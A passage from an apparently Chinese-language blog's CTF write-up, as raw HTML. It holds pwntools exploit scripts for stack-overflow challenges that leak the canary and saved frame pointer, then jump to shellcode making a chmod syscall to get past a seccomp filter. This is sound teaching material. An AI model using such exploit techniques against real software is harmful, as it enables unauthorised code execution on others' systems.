</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0xe0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chall1 buf&#39;</span><span class=p>,</span> <span class=n>chall1_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0xa0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>val</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=60-1>6.0</h3><p>在 5.0 的基础上需要把栈上的 seccomp 参数改成需要的系统调用号。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0x1a0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chall1 buf&#39;</span><span class=p>,</span> <span class=n>chall1_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x5a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2022-02-24</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/linux/>Linux</a>,&nbsp;<a href=/tags/c/c++/>C/C++</a>,&nbsp;<a href=/tags/python/>Python</a>,&nbsp;<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/>整数溢出</a>,&nbsp;<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/>栈漏洞</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/pet/ class=prev rel=prev title=扑朔迷离：隐私增强技术实践><i class="fas fa-angle-left fa-fw"></i>扑朔迷离：隐私增强技术实践</a>
<a href=/hugo/ class=next rel=next title="乔迁新居：Hugo 博客的配置与部署">乔迁新居：Hugo 博客的配置与部署<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.99.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>